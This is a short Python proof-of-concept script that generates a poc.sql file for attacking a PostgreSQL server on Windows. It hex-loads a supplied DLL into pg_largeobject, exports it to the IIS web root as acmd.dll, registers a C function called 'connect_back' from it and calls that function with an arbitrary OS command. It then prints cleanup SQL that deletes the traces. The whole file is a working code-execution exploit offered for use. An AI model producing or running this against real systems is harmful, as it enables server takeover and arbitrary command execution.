#!/usr/bin/env python3

#You can use this script to automate the creation of the Database queries by supplying the OS command and the DLL.

import sys

if len(sys.argv) != 3:
    print("(+) usage %s <Command> <dll/so>" % sys.argv[0])
    print("(+) eg: %s OScommand si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

Command = sys.argv[1]
lib = sys.argv[2]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, $$C://inetpub//wwwroot//acmd.dll$$);"
sql += "CREATE FUNCTION Test(text) RETURNS void AS $$C://inetpub//wwwroot//acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;"
sql += "select Test('%s');" % (Command)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function Test(text);")
